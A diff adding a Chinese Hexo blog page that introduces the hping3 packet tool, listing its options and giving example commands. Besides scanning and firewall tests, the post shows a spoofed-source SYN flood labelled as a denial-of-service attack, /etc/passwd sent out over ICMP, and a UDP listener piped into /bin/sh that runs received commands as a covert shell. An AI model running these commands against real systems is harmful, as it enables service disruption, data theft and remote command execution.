@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="cn">
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="hzjsea">
+
+
+
+
+
+
+<title>linux命令hping3 | hzjsea</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+    <script src="/js/jquery.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+
+
+    <script>
+    function searchToggle() {
+        const width = $(document.body).width()
+        if(width > 479) {
+            return;
+        }
+        const search = $('.search');
+        const searchForm = $('.form-search')
+
+        if(!search.hasClass("mobile-search")) {
+            search.addClass("mobile-search");
+        } else {
+            search.removeClass("mobile-search");
+        } 
+    }
+
+    function search(searchInputEl, formEl, flag) {
+        const path = "/" + "search.json"; // 可以在public 下查看这个search.json
+        $(formEl).submit(function(e){
+            e.preventDefault();
+            let target = null
+            if(searchInputEl == null) {
+                const screenWidth = $(document.body).width();
+                target = screenWidth > 479 ? $('#pc-search-input') : $('#mobile-search-input');
+                console.log(target);
+            } else {
+                target = $(searchInputEl)
+            }
+
+            if(!flag && target.val() === '') {
+                return ;
+            }
+
+            $("#u-search").fadeIn(500, function() {
+                $("body > .wrapper").addClass("modal-active");
+
+                $.ajax({
+                    url: path,
+                    dataType: "json",
+                    beforeSend: function (xhr) {
+                        $input = target.val();
+                        $(".form-input").val($input);
+                        const loadingBar = $('.search-loading-bar') 
+                        loadingBar.css({
+                            width:'100%',
+                            display: 'block'
+                        });
+                    },
+                    success: function( datas ) {
+                        console.log(datas);
+                        const $resultPanel = $(".modal-body")[0];
+                        let str = `<ul class="modal-results">`;
+                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
+                        $resultPanel.innerHTML = "";
+                        let hasResult = false
+                        let text = `<div class="no-result">找不到与关键词相关的内容....</div>`;
+
+                        if ($(".form-input").val().trim().length <= 0) {
+                            // 没有结果
+                            $resultPanel.innerHTML = text;
+                            return;
+                        }
+                        datas.forEach(function (data, index) {
+                            var isMatch = true;
+                            if (!data.title || data.title.trim() === '') {
+                                data.title = "Untitled";
+                            }
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content && data.content.trim().replace(/<[^>]+>/g, "").toLowerCase() || '';
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty contents
+                            if (data_content !== '') {
+                                keywords.forEach(function (keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        hasResult = true
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            } else {
+                                isMatch = false;
+                            }
+                            // show search results
+                            if (isMatch) {
+                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 200 characters
+                                    var start = first_occur - 40;
+                                    var end = first_occur + 160;
+
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+
+                                    if (start == 0) {
+                                        end = 200;
+                                    }
+
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+
+                                    var match_content = content.substring(start, end);
+
+                                    // highlight all keywords
+                                    keywords.forEach(function (keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
+                                    });
+
+                                    str += `<span class="content"> ${match_content} ...</span></a>`;
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        if(hasResult) {
+                            $resultPanel.innerHTML = str;
+                        } else {
+                            $resultPanel.innerHTML = text;
+                        }
+
+                    },
+                    complete: function() {
+                        setTimeout(() => {
+                                const loadingBar = $('.search-loading-bar') 
+                                loadingBar.css({
+                                    width:'0%',
+                                    display: 'none'
+                                });
+                        }, 300)
+                    }
+                });
+            })
+
+        });
+    }
+
+    $(document).ready(function() {
+        $('.modal-close').click(function () { 
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+
+        $('.modal-overlay').click(function() {
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+        search(null, ".form-search", false)
+        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
+    })
+</script>
+
+
+
+<meta name="generator" content="Hexo 5.2.0"><!-- hexo-inject:begin --><!-- hexo-inject:end --><link rel="stylesheet" href="/css/prism-base16-ateliersulphurpool.light.css" type="text/css"></head>
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo"><a href="/">hzjsea</a></div>
+        <div class="menu navbar-right">
+            
+            
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="Searching" autocomplete="off" id="pc-search-input"/>
+        </form>
+    </div>
+
+
+            
+                <a class="menu-item" href="/archives">文章</a>
+            
+                <a class="menu-item" href="/category">分类</a>
+            
+                <a class="menu-item" href="/tag">标签</a>
+            
+                <a class="menu-item" href="/about">关于</a>
+            
+            <input id="switch_default" type="checkbox" class="switch_default">
+            <label for="switch_default" class="toggleBtn"></label>
+        </div>
+    </div>
+</nav>
+
+
+<nav class="navbar-mobile" id="nav-mobile">
+    <div class="container">
+        <div class="navbar-header">
+            <div>
+                <a href="/">hzjsea</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+            </div>
+            <div class="navbar-mobile-right">
+                
+                
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="Searching" autocomplete="off" id="mobile-search-input"/>
+        </form>
+    </div>
+
+
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; 目录</div>
+            </div>
+            
+        </div>
+        <div class="menu" id="mobile-menu">
+            
+                <a class="menu-item" href="/archives">文章</a>
+            
+                <a class="menu-item" href="/category">分类</a>
+            
+                <a class="menu-item" href="/tag">标签</a>
+            
+                <a class="menu-item" href="/about">关于</a>
+            
+        </div>
+    </div>
+</nav>
+
+        <div class="main">
+			<!-- Chic/layout.ejs -->
+ <div id="u-search">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="container">
+                    <form id="u-search-modal-form" class="u-search-modal-form">
+                        <button type="submit" class="form-submit-btn">
+                            <img src="/image/search.png" class="search-btn-img" />
+                        </button>
+                        <input placeholder="搜索文章。。。" class="form-input" id="modal-form-input">
+                    </form>
+                    <a class="modal-close">x</a>
+                </div>
+                <div class="search-loading">
+                    <div class="search-loading-bar"></div>
+                </div>
+            </div>
+            <div class="modal-body">
+                <!-- ul 格式如下 -->
+                <!-- <ul class="modal-results">
+                    <li class="result-item">
+                        <a class="result-item-detail">
+                            <span class="title">页面配置</span>
+                            <span class="content">
+                                content
+                            </span>
+                        </a>
+                    </li>
+                </ul> -->
+            </div>
+        </div>
+        <div class="modal-overlay"></div>
+    </div>
+            <div class="container">
+    
+    
+    <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">回到底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部折叠"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">linux命令hping3</h1>
+            
+            <div class="post-meta">
+                
+                作者： <a itemprop="author" rel="author" href="/">hzjsea</a>&nbsp;
+                
+
+                
+                <span class="post-time">
+                    创建日期： <a
+                        href="#">December 11, 2020&nbsp;&nbsp;10:08:06</a>
+                </span>&nbsp;
+                
+                
+                <span class="post-category">
+                    分类：
+                    
+                    <a href="/categories/linux/">linux</a>&nbsp;
+                    
+                </span>
+                
+                
+                状态：<a href="#">SNAPSHOT</a>
+                
+            </div>
+            
+        </header>
+
+        <div class="post-content">
+            <a id="more"></a>   
+
+<h1 id="linux命令hping3"><a href="#linux命令hping3" class="headerlink" title="linux命令hping3"></a>linux命令hping3</h1><p>hping是安全审计、防火墙测试等工作的标配工具。<code>hping优势在于能够定制数据包的各个部分</code>，因此用户可以灵活对目标机进行细致地探测。</p>
+<p>安装</p>
+<pre class=" language-bash"><code class="language-bash">yum <span class="token function">install</span> hping3 -y</code></pre>
+<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><blockquote>
+<p>参数</p>
+</blockquote>
+<pre class=" language-bash"><code class="language-bash">-h --help 显示帮助信息
+-v --version 显示Hping的版本信息
+-c --count 指定数据包的次数
+-i --interval 指定发包间隔为多少毫秒，如-i m10：表示发包间隔为10毫秒<span class="token punctuation">(</span>附:秒、毫秒、微秒进率。1s<span class="token operator">=</span>1000ms<span class="token punctuation">(</span>毫秒<span class="token punctuation">)</span><span class="token operator">=</span>1000000<span class="token punctuation">(</span>微秒<span class="token punctuation">)</span>，1s<span class="token operator">=</span>103ms<span class="token punctuation">(</span>毫秒<span class="token punctuation">)</span><span class="token operator">=</span>106μs<span class="token punctuation">(</span>微秒<span class="token punctuation">))</span>
+–fast 与-i m100等同，即每秒钟发送10个数据包<span class="token punctuation">(</span>hping的间隔u表示微妙，－－fast表示快速模式，一秒10个包。<span class="token punctuation">)</span>
+-n --numeric 指定以数字形式输出,表示不进行名称解析。
+-q --quiet 退出Hping
+-I --interface 指定IP，如本机有两块网卡，可通过此参数指定发送数据包的IP地址。如果不指定则默认使用网关IP
+-V --verbose 详细模式,一般显示很多包信息。
+-D --debug 定义hping使用debug模式。
+-z --bind 将ctrl+z 绑定到ttl，默认使用DST端口
+-Z --unbind 解除ctrl+z的绑定
+
+指定所用的模式：
+<span class="token punctuation">(</span>缺省使用TCP进行PING处理<span class="token punctuation">)</span>
+-0 --rawip 裸IP方式,使用RAWSOCKET方式。
+-1 --icmp ICMP 模式
+-2 --udp UDP 模式
+-8 --scan 扫描模式. <span class="token punctuation">(</span>例: hping --scan 1-30,70-90 -S www.target.host<span class="token punctuation">)</span>
+-9 --listen 监听模式，会接受指定的信息。侦听指定的信息内容。
+
+IP选项：
+
+-a --spoof 源地址欺骗
+–rand-dest 随机目的地址模式
+–rand-source 随机源目的地址模式
+-t --ttl ttl值，默认为64
+-N --id 指定id，默认是随机的
+-W --winid 使用win*的id 字节顺序,针对不同的操作系统。
+-r --rel 相对的id区域
+-f --frag 将数据包分片后传输<span class="token punctuation">(</span>可以通过薄弱的acl<span class="token punctuation">(</span>访问控制列表<span class="token punctuation">))</span>
+-x --morefrag 设置更多的分片标记
+-y --dontfrag 设置不加分片标记
+-g --fragoff 设置分片偏移
+-m --mtu 设置虚拟MTU, 当数据包<span class="token operator">></span>MTU时要使用–frag 进行分片
+-o --tos 指定服务类型，默认是0x00,，可以使用–tos help查看帮助
+-G --rroute 包含RECORD_ROUTE选项并且显示路由缓存
+–lsrr 释放源路记录
+–ssrr 严格的源路由记录
+-H --ipproto 设置协议范围，仅在RAW IP模式下使用
+
+ICMP选项
+
+-C --icmptype 指定icmp类型（默认类型为回显请求）
+-K --icmpcode 指定icmp编码（默认为0）
+–force-icmp 发送所有ICMP数据包类型（默认只发送可以支持的类型） --icmp-gw 针对ICMP数据包重定向设定网关地址（默认是0.0.0.0）
+–icmp-ts 相当于–icmp --icmptype 13（ICMP时间戳）
+–icmp-addr 相当于–icmp --icmptype 17（ICMP地址掩码）
+–icmp-help 显示ICMP的其它帮助选项
+
+UDP/TCP选项
+
+-s --baseport 基本源端口（默认是随机的）
+-p --destport 目的端口（默认为0），可同时指定多个端口
+-k --keep 仍然保持源端口
+-w --win 指定数据包大小，默认为64
+-O --tcpoff 设置假的TCP数据偏移
+-Q --seqnum 仅显示TCP序列号
+-b --badcksum 尝试发送不正确IP校验和的数据包<span class="token punctuation">(</span>许多系统在发送数据包时使用固定的IP校验和，因此你会得到不正确的UDP/TCP校验和.<span class="token punctuation">)</span>
+-M --setseq 设置TCP序列号
+-L --setack 使用TCP的ACK（访问控制列表）
+-F --fin 使用FIN标记set FIN flag
+-S --syn 使用SNY标记
+-R --rst 使用RST标记
+-P --push 使用PUSH标记
+-A --ack 使用 ACK 标记
+-U --urg 使用URG标记
+-X --xmas 使用 X 未用标记 <span class="token punctuation">(</span>0x40<span class="token punctuation">)</span>
+-Y --ymas 使用 Y 未用标记 <span class="token punctuation">(</span>0x80<span class="token punctuation">)</span>
+–tcpexitcode 最后使用 tcp-<span class="token operator">></span>th_flags 作为退出代码
+–tcp-timestamp 启动TCP时间戳选项来猜测运行时间
+
+常规选项
+
+-d --data 数据大小，默认为0
+-E --file 从指定文件中读取数据
+-e --sign 增加签名
+-j --dump 以十六进行形式转存数据包
+-J --print 转存可输出的字符
+-B --safe 启用安全协议
+-u --end 当通过- -file指定的文件结束时停止并显示，防止文件再从头开始
+-T --traceroute 路由跟踪模式
+–tr-stop 在路由跟踪模式下当收到第一个非ICMP数据包时退出
+–tr-keep-ttl 保持源TTL，对监测一个hop有用
+–tr-no-rtt 使用路由跟踪模式时不计算或显示RTT信息
+
+ARS数据包描述<span class="token punctuation">(</span>新增加的内容，暂时还不稳定<span class="token punctuation">)</span>
+–apd-send 发送用描述APD的数据包
+</code></pre>
+<blockquote>
+<p>防火墙测试</p>
+</blockquote>
+<ul>
+<li>-S 表示只发送SYN包, 也就是握手协议中的请求包</li>
+<li>-c 表示发包的数量</li>
+<li>-a hostname 表示伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了</li>
+<li>-p 表示目的端口<pre class=" language-bash"><code class="language-bash">hping3 -S  -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10</code></pre>
+</li>
+</ul>
+<blockquote>
+<p>端口扫描</p>
+</blockquote>
+<ul>
+<li>-I eth0指定使用eth0端口</li>
+<li>-S指定TCP包的标志位SYN</li>
+<li>-p 80指定探测的目的端口<pre class=" language-bash"><code class="language-bash">hping3 -I eth0  -S 192.168.10.1 -p 80</code></pre>
+</li>
+</ul>
+<blockquote>
+<p>拒绝服务攻击</p>
+</blockquote>
+<ul>
+<li>-I 指定网卡</li>
+<li>-a 伪造ip</li>
+<li>-S 发送syn包</li>
+<li>-p 指定目的端口</li>
+<li>-i 指定发送间隔的时间 u1000表示1000微秒<pre class=" language-bash"><code class="language-bash">hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000</code></pre>
+</li>
+</ul>
+<blockquote>
+<p>文件传输</p>
+</blockquote>
+<ul>
+<li>–listen 表示监听指定内容,这里表示监听signature的内容</li>
+<li><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 接收端</span>
+hping3 192.168.1.159--listen signature --safe  --icmp
+<span class="token comment" spellcheck="true"># 发送端</span>
+hping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd</code></pre>
+</li>
+</ul>
+<blockquote>
+<p>发送程序</p>
+</blockquote>
+<pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 接收端</span>
+hping3 192.168.10.66--listen signature --safe --udp -p 53 <span class="token operator">|</span> /bin/sh
+<span class="token comment" spellcheck="true"># 发送端</span>
+<span class="token keyword">echo</span> <span class="token function">ls</span> <span class="token operator">></span>test.cmd
+hping3 192.168.10.44 -p53 -d 100 --udp --sign signature --file ./test.cmd</code></pre>
+<p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2017/07/23/hping3/#ICMP-Flood%E6%94%BB%E5%87%BB">https://mochazz.github.io/2017/07/23/hping3/#ICMP-Flood%E6%94%BB%E5%87%BB</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/123226453">https://zhuanlan.zhihu.com/p/123226453</a></p>
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>标签：</span>
+                <span class="tag">
+                    
+                    
+                    <a href="/tags/linux/"># linux</a>
+                    
+                    <a href="/tags/linuxcc/"># linuxcc</a>
+                    
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript：window.history.back();">后退</a>
+                <span>· </span>
+                <a href="/">主页</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            <a class="prev" rel="prev" href="/2020/12/11/blog_back_new/linux/linux%E5%91%BD%E4%BB%A4tcpdump/">linux命令tcpdump</a>
+            
+            
+            <a class="next" rel="next" href="/2020/12/09/blog_back_new/linux/linux%E5%91%BD%E4%BB%A4crond/">linux命令crond</a>
+            
+        </section>
+    </article>
+</div>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+    </div>
+</footer>
+
+    </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+</html>
